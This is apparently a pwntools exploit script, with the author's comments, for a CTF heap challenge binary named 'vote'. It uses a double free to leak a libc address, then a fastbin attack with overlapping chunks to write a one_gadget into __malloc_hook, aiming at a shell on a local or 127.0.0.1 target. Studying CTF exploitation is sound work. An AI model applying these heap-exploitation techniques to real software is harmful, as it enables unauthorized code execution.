#!/usr/bin python
'''
Strictly, in ubutun 16.04.4, in cancel function the printf 
will trigger malloc()~ So i must test the exploit in ubutun 14.
However, the one_gadget won't succeed. Anyway, it sucks..
'''

from pwn import *
import sys

def create(p, size, name):
	p.recvuntil("Action: ")
	p.sendline('0')
	p.recvuntil("Please enter the name's size: ")
	p.sendline(str(size))
	p.recvuntil("Please enter the name: ")
	p.send(name)

def show(p, index):
	p.recvuntil("Action: ")
	p.sendline('1')
	p.recvuntil("Please enter the index: ")
	p.sendline(str(index))
	p.recvuntil("count: ")
	addr = int(p.recvuntil('\n'))
	return addr

def cancel(p, index):
	p.recvuntil("Action: ")
	p.sendline('4')
	p.recvuntil("Please enter the index: ")
	p.sendline(str(index))
	

'''
We just ignore the vote function~
A double-free loophole. No fresh skill~
'''
def exploit(p):
	'''
	No doubt, just leak the libc address
	At the beginning, I try to solve the chanllege by unlink.
	But be careful, because of the fields count and time, we can't 
	find a pointer that saves a unlink-heap-pointer. In another way,
	the bss secition saves pointers that point to the structures like
	this:
	struct{
		unsigned long count;
		unsigned long time;
		char *name
	}
	So, just find another way.
	'''
	#My habit~I love to create 4 heap-chunks~
	create(p, 0xa0, 'a'*0xa0) #0
	create(p, 0xa0, 'b'*0xa0) #1 
	create(p, 0x50, 'c'*0x50) #2 
	create(p, 0x50, 'd'*0x50) #3

	cancel(p, 0)
	
	leak_addr = show(p, 0)
	print "[+] leaked address: " + hex(leak_addr)
	libc_addr = leak_addr - 0x3c1760 - 0x58
	print '[+] libc address: ' + hex(libc_addr)
	'''
	if one_gadget doesn't work, just overwrite free_got
	with system address.
	'''
	one_gadget = libc_addr + 0x4647c
	print '[+] one_gadget: ' + hex(one_gadget)
	malloc_hook = libc_addr + 0x3c1740
	print '[+] malloc_hook: ' + hex(malloc_hook)
	##A little ajustment because of the field count and time
	target = malloc_hook - 0x23

	print '[+] target: ' + hex(target)

	'''
	It's clear we can't abuse smallbin.
	Since it's so, we use fastbin attack.
	'''
	cancel(p, 1)
	'''
	-------
	|	  |<--0xc0--
	-------         |-->0x180
	|     |<--0xc0--
	-------
	|  2  |
	-------
	|  3  |
	-------
	-------------------
	|    0    |        |
	|         |     1  |
	-------------------
	consolidate 0 with 1, make a fake fastbin chunk in 1.
	Free 1. Attention the next size when freeing 1.
	free the big chunk
	then allocate the big chunk
	And chunk 1 is overlapping. 
	And you can overwrite the fd.
	'''
	payload  = 'e' * 0xa0 + p64(0) + p64(0x71) + 'e' * 0x60 
	payload += p64(0) + p64(0x71)
	create(p, 0x160, payload + '\n') #4
	#gdb.attach(p)
	cancel(p, 1) # 1-->null in 0x70-fastbin
	cancel(p, 4) 
	
	payload = 'e' * 0xa0 + p64(0) + p64(0x71) + p64(target)
	create(p, 0x160, payload + '\n') #1
	create(p, 0x50, '1' * 0x50) #5
	'''
	gdb-peda$ p main_arena 
	$1 = {
  	mutex = 0x0, 
  	flags = 0x0, 
  	fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x7fd7d5dde71d, 0x0, 0x0, 0x0, 0x0}, 
  	top = 0x2069260, 
  	......
	gdb-peda$ x/20gx 0x7fd7d5dde71d
	0x7fd7d5dde71d:	0xd7d5aa0bb0000000	0x000000000000007f
	0x7fd7d5dde72d:	0xd7d5aa0b50000000	0x000000000000007f
	0x7fd7d5dde73d:	0x0000000000000000	0x0000000000000000
	0x7fd7d5dde74d:	0x0000000000000000	0x0000000000000000
	0x7fd7d5dde75d:	0x0000000000000000	0x0000000000000000
	'''
	gdb.attach(p)
	create(p, 0x50, '\x00' * 3 + p64(one_gadget) + '\n') #6
	'''
	gdb-peda$ p __malloc_hook 
	$2 = (void *(*)(size_t, const void *)) 0x7f1d088d847c <do_system+956>
	But the conditon for one_gadget is not satisfied! gg~
	'''
	#gdb.attach(p)
	create(p, 0x80, '2' * 0x80)


	p.interactive()
	

if __name__ == "__main__":
	if len(sys.argv) > 1:
		p = remote('127.0.0.1', 6666)
	else:
		p = process('./vote')

	exploit(p)
